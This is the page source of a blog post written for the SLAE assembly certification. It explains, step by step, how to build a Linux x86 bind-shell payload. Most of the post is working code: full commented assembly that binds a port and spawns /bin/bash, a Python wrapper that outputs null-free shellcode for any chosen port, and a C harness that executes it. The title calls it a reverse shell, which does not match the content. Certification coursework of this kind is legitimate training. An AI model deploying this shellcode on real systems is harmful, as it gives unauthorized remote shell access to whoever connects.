@@ -1,0 +1,221 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE - Assignment 2 - Reverse TCP Shellcode" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE-Bind/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE-Bind/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-15T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE - Assignment 2 - Reverse TCP Shellcode" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-15T05:44:00+00:00","datePublished":"2021-01-15T05:44:00+00:00","description":"Introduction","headline":"SLAE - Assignment 2 - Reverse TCP Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE-Bind/"},"url":"https://whitecr0wz.github.io/posts/SLAE-Bind/"}</script><title>SLAE - Assignment 2 - Reverse TCP Shellcode | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE - Assignment 2 - Reverse TCP Shellcode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE - Assignment 2 - Reverse TCP Shellcode</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1610689440" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 15, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2446 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h4 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at Linux Bind Shells.</p><p>A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of the compromised system, instead of arranging a specific connection on a trivial address.</p><p>The first assignment from the seven requires the creation of a Bind Shell through the Assembly language, and converting such into shellcode. Moreover, it is required to write a wrapper in any language of preference that is capable of easily configuring the port.</p><h4 id="theory"><span class="mr-2">Theory</span><a href="#theory" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>In order to create a Bind Shell, 6 main functions are required:</p><ul><li><p>Socket</p><li><p>Bind</p><li><p>Listen</p><li><p>Accept</p><li><p>Dup2</p><li><p>Execve</p></ul><h4 id="time-to-stick-our-hands-into-the-mud"><span class="mr-2">Time to stick our hands into the mud</span><a href="#time-to-stick-our-hands-into-the-mud" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first thing required is to clean the registers, as when we execute our program, it will work as a charm, however, when introduced into a real program within a context of binary exploitation with different variables that alter the registers, it may not. Due to this, it’s better to have a set of instructions that clean the registers that will be employed:</p><pre><code class="language-term">global _start
+
+section .text
+
+_start:
+
+       xor eax, eax           ; Zeroes out EAX.
+       xor ebx, ebx           ; Zeroes out EBX.
+       xor ecx, ecx           ; Zeroes out ECX.
+       xor edx, edx           ; Zeroes out EDX.
+       xor esi, esi           ; Zeroes out ESI.
+</code></pre><h5 id="socket"><span class="mr-2">Socket</span><a href="#socket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="creates-an-endpoint-for-communication">Creates an endpoint for communication</h6><p>Our next step is to initialize the socket. In order to concrete such action, it is required to move the value of the socket (359) syscall into eax. I have chosen to push the value as a word into the ax register, in order to avoid null characters. Furthermore, according to the syscall man page for socket, the required flags involve domain (EBX), type (ECX) and protocol (EDX). A common combination when it comes to remote shells is AF_INET, SOCK_STREAM. According to <a href="https://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html">this file</a>, the value of AF_INET is 2 and SOCK_STREAM 1, therefore, this will be reflected on the EBX and ECX registers. Finally, the value of protocol (EDX) isn’t actually very relevant. Due to this, EDX is simply pushed.</p><pre><code class="language-term">socket:
+
+       push word 359          ; Pushes word 359 (socket) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov bl, 2              ; Moves value 2 into bl, giving the value AF_INET.
+       mov cl, 1              ; Moves value 1 into bl, giving the value SOCK_STREAM.
+       push edx               ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
+       int 0x80               ; Call to kernel.
+       mov esi, eax           ; Saves the value of eax for sockfd values later on.
+</code></pre><p>As you can see, the value of EAX has been copied to ESI, this will be very useful as storage of the file descriptor value from socket for later operations.</p><h5 id="bind"><span class="mr-2">Bind</span><a href="#bind" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="binds-a-name-to-a-socket">Binds a name to a socket</h6><p>The next step is to concrete the Bind function. The process is quite similar to socket, the value of the syscall in <code class="language-plaintext highlighter-rouge">/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code> is 361. According to the manpage, the arguments are <code class="language-plaintext highlighter-rouge">int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);</code>. As aforementioned, ESI will be used to satisfy the sockfd argument. Furthermore, in order to satisfy the struct, it is required to push the following values:</p><ul><li>0 (As it is required to push 0, the instruction PUSH EDX will be used.)<li>IP Address (As this is a bind shell, it is required to listen in all interfaces. Therefore, this will be set to 0 through pushing EDX.)<li>Chosen Port (The chosen port will be pushed in hex as a word.)<li>AF_INET</ul><p>Finally, it is regarding to point out in EDX the length of such struct, which is 16.</p><pre><code class="language-term">bind:
+
+       push word 361          ; Pushes word 361 (bind) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       push edx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are 
+                              ; pushed through EDX.
+       push edx               ; The same as stated above.
+       push word 0x2823       ; Pushes the word 9000 into the stack.
+       push word 0x02         ; Pushes AF_INET into the stack.
+       mov ecx, esp           ; Copies the value of ESP into ECX.
+       mov dl, 16             ; The value 16 is inserted into DL, as this argument requires the length of the struct.
+       int 0x80               ; Call to kernel.
+</code></pre><h5 id="listen"><span class="mr-2">Listen</span><a href="#listen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="listens-for-connections-on-a-socket">Listens for connections on a socket</h6><p>Time to set the listen syscall. This is starting to come together, isn’t it? According to the manpage for such syscall the arguments are the following:</p><pre><code class="language-term">int listen(int sockfd, int backlog);
+</code></pre><p>This is quite easy to concrete. As in the previous snippets, the value of ESI will be copied into EBX in order to point to the socket file descriptor. Moreover, as the backlog isn’t crucial (defines the maximum length to which the queue of pending connections for sockfd may grow) it will simply be set to 0.</p><pre><code class="language-term">listen:
+
+       push word 363          ; Pushes word 363 (listen) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       xor ecx, ecx           ; Zeroes ECX out.
+       push ecx               ; Pushes ECX (0), as the backlog isn't really important.
+       int 0x80               ; Call to kernel.
+</code></pre><h5 id="accept"><span class="mr-2">Accept</span><a href="#accept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="accepts-a-connection-on-a-socket">Accepts a connection on a socket</h6><p>Interestingly enough, there is no syscall in <code class="language-plaintext highlighter-rouge">/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code> for accept. However, accept4 (364) exists, which grants a similar functionality. Moreover, if the arguments are satisfied with 0, the syscall will act as accept.</p><p>Snippet from the manpage:</p><p><code class="language-plaintext highlighter-rouge">If flags is 0, then accept4() is the same as accept().</code></p><p>Arguments for accept4:<code class="language-plaintext highlighter-rouge">int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);</code></p><pre><code class="language-term">accept4:
+
+       push word 364          ; Pushes word 364 (accept4) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       xor ecx, ecx           ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0.
+       xor edx, edx           ; Due to this event, the following registers will be set to 0 to cause such circumstance.
+       xor esi, esi           ; The same as stated above.
+       int 0x80               ; Call to kernel.
+       mov esi, eax           ; Saves the value of eax for sockfd values later on.
+</code></pre><p>As you can see, ESI is once again saving the value of EAX, exactly as when we started. This is due to the fact that now the file descriptor for socket is no longer required. And now it is important to use the accept() file descriptor for the next syscalls.</p><h5 id="dup2"><span class="mr-2">Dup2</span><a href="#dup2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="duplicate-a-file-descriptor">Duplicate a file descriptor</h6><p>We now may have a bind shell. However, this is completely useless if it isn’t functional, right? This is where dup2 comes in, our little friend will iterate 3 times in order to copy into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors, therefore making the shell interactive. There are two ways to perform this task, either copying and writing three times or performing a loop. The latter sounds more fun, right? ECX will be used with a JNZ (jump if the zero flag (ZF) is not set) instruction as well, performing a loop which will not stop until ECX reaches to zero through a dec cl instruction.</p><pre><code class="language-term">       mov cl, 3              ; Starts counter for dup2
+       
+dup2:
+       push word 63           ; Pushes word 63 (dup2) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall.
+       dec cl                 ; Decrements cl in order to set the zero flag (ZF)
+       int 0x80               ; Call to kernel
+
+       jnz dup2               ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
+</code></pre><h5 id="execve"><span class="mr-2">Execve</span><a href="#execve" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><h6 id="execute-program">Execute program</h6><p>This may be the last syscall to be initialized, yet it is the most important, no shell, no access! The process is quite simple, a group of three dwords containing the string <code class="language-plaintext highlighter-rouge">////bin/bash</code> will be copied into ebx through PUSH and MOV instructions. Moreover, the value of EDX will be set to 0, as envp is not required. Finally, as ECX needs to point to the string, EBX will be pushed into the stack, therefore ECX copying its value through a MOV instruction.</p><pre><code class="language-term">execve:
+
+       xor eax, eax           ; Zeroes out EAX
+       push eax               ; Pushes EAX (0x00000000)
+
+       PUSH 0x68736162        ; hsab
+       PUSH 0x2f6e6962        ; /nib
+       PUSH 0x2f2f2f2f        ; ////
+
+       mov ebx, esp           ; Copies the pushed instructions into EBX.
+       push eax               ; Pushes EAX (0x00000000)
+
+       mov edx, esp           ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0
+
+       push ebx               ; Pushes ////bin/bash into the stack
+       mov ecx, esp           ; Copies such value to ECX
+       push word 11           ; Pushes word 11 (execve) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       int 0x80               ; Calls to kernel
+</code></pre><p>Final code:</p><pre><code class="language-term">global _start
+
+section .text
+
+_start:
+
+       xor eax, eax           ; Zeroes out EAX.
+       xor ebx, ebx           ; Zeroes out EBX.
+       xor ecx, ecx           ; Zeroes out ECX.
+       xor edx, edx           ; Zeroes out EDX.
+       xor esi, esi           ; Zeroes out ESI.
+
+socket:
+
+       push word 359          ; Pushes word 359 (socket) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov bl, 2              ; Moves value 2 into bl, giving the value AF_INET.
+       mov cl, 1              ; Moves value 1 into bl, giving the value SOCK_STREAM.
+       push edx               ; There isn't anything really needed within this parameter, so 0 is pushed from EDX.
+       int 0x80               ; Call to kernel.
+       mov esi, eax           ; Saves the value of eax for sockfd values later on.
+
+bind:
+
+       push word 361          ; Pushes word 361 (bind) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       push edx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are 
+                              ; pushed through EDX.
+       push edx               ; The same as stated above.
+       push word 0x2823       ; Pushes the word 9000 into the stack.
+       push word 0x02         ; Pushes AF_INET into the stack.
+       mov ecx, esp           ; Copies the value of ESP into ECX.
+       mov dl, 16             ; The value 16 is inserted into DL, as this argument requires the length of the struct.
+       int 0x80               ; Call to kernel.
+
+listen:
+
+       push word 363          ; Pushes word 363 (listen) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       xor ecx, ecx           ; Zeroes ECX out.
+       push ecx               ; Pushes ECX (0), as the backlog isn't really important.
+       int 0x80               ; Call to kernel.
+
+accept4:
+
+       push word 364          ; Pushes word 364 (accept4) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
+       xor ecx, ecx           ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0.
+       xor edx, edx           ; Due to this event, the following registers will be set to 0 to cause such circumstance.
+       xor esi, esi           ; The same as stated above.
+       int 0x80               ; Call to kernel.
+       mov esi, eax           ; Saves the value of eax for sockfd values later on.
+
+       mov cl, 3              ; Starts counter for dup2
+
+dup2:
+
+       push word 63           ; Pushes word 63 (dup2) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall.
+       dec cl                 ; Decrements cl in order to set the zero flag (ZF)
+       int 0x80               ; Call to kernel
+
+       jnz dup2               ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.
+
+execve:
+
+       xor eax, eax           ; Zeroes out EAX
+       push eax               ; Pushes EAX (0x00000000)
+
+       PUSH 0x68736162        ; hsab
+       PUSH 0x2f6e6962        ; /nib
+       PUSH 0x2f2f2f2f        ; ////
+
+       mov ebx, esp           ; Copies the pushed instructions into EBX.
+       push eax               ; Pushes EAX (0x00000000)
+
+       mov edx, esp           ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0
+
+       push ebx               ; Pushes ////bin/bash into the stack
+       mov ecx, esp           ; Copies such value to ECX
+       push word 11           ; Pushes word 11 (execve) into the stack.
+       pop ax                 ; Pops such word into ax so there are no nulls.
+       int 0x80               ; Calls to kernel
+</code></pre><p>Let’s assemble and link the file!</p><p><img data-src="/assets/img/SLAE/SLAE32/Assignment_1/1.png" alt="" data-proofer-ignore></p><h4 id="the-wrapper"><span class="mr-2">The Wrapper</span><a href="#the-wrapper" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>As stated in the introduction, one additional detail given in the assignment is to create a wrapper (in any language) that easily configures the port for the bind shell.</p><p>Wrapper code:</p><pre><code class="language-term">import socket, sys, struct
+
+if len(sys.argv) != 2:
+
+      print "[*] Example: /usr/bin/python wrapper.py &lt;port&gt;"
+      sys.exit(1)
+
+port = sys.argv[1]
+port = int(port)
+port = socket.htons(port)
+hexport = hex(port)
+hexport = struct.pack("&lt;H", port).encode("hex")
+
+final_port = "\\x"+"\\x".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))
+
+buf = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66"
+"\\x58\\x89\\xf3\\x52\\x52\\x66\\x68"
++ final_port +
+"\\x66\\x6a\\x02\\x89\\xe1\\xb2"
+"\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd"
+"\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6"
+"\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9"
+"\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69"
+"\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
+"\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80")
+
+print '"' + (buf) + '"'
+</code></pre><h6 id="executing-the-wrapper">Executing the wrapper:</h6><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/assignment_1$ python wrapper.py 57326 
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\xdf\xee\x66\x6a\x02\x89\xe1
+\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\
+xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80"
+whitecr0wz@SLAE:~/assembly/assignments/assignment_1$
+</code></pre><p>Let’s test this on a C file to make sure that the shellcode could work on a real environment:</p><pre><code class="language-term">cat bind.c 
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+unsigned char code[] = \
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\x68\x67\x01\x66\x58\xb3\x02\xb1\x01\x52\xcd\x80\x89\xc6\x66\x68\x69\x01\x66\x58\x89\xf3\x52\x52\x66\x68\xdf\xee\x66\x6a\x02\x89\xe1
+\xb2\x10\xcd\x80\x66\x68\x6b\x01\x66\x58\x89\xf3\x31\xc9\x51\xcd\x80\x66\x68\x6c\x01\x66\x58\x89\xf3\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x66\x6a\x3f\x66\x58\x89\xf3\
+xfe\xc9\xcd\x80\x75\xf3\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x66\x6a\x0b\x66\x58\xcd\x80"
+;
+
+main()
+{
+
+  printf("Shellcode Length:  %d\n", strlen(code));
+
+        int (*ret)() = (int(*)())code;
+
+        ret();
+
+}
+</code></pre><h4 id="endgame"><span class="mr-2">EndGame</span><a href="#endgame" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p><img data-src="/assets/img/SLAE/SLAE32/Assignment_1/2.png" alt="" data-proofer-ignore></p><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE-27812/PA-27812</p><p>You can find all of the used resources within this post <a href="https://github.com/whitecr0wz/SLAE/tree/main/Assignment_1">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae/'>SLAE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE+-+Assignment+2+-+Reverse+TCP+Shellcode+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Bind%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE+-+Assignment+2+-+Reverse+TCP+Shellcode+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Bind%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Bind%2F&text=SLAE+-+Assignment+2+-+Reverse+TCP+Shellcode+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SLAE64-Egghunter/"><div class="card-body"> <em class="small" data-ts="1611467040" data-df="ll" > Jan 24, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 3 - Egghunter</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a clo...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Encoder/"><div class="card-body"> <em class="small" data-ts="1611553440" data-df="ll" > Jan 25, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 4 - Custom Insertion Encoder</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look ...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Analyzing-Shellcode/"><div class="card-body"> <em class="small" data-ts="1611639840" data-df="ll" > Jan 26, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</h3><div class="text-muted small"><p> These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. The fifth assignment from the seven requires ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE-Reverse/" class="btn btn-outline-primary" prompt="Older"><p>SLAE - Assignment 1 - Bind TCP Shellcode</p></a> <a href="/posts/SLAE-Egghunter/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE - Assignment 3 - Egghunter</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a 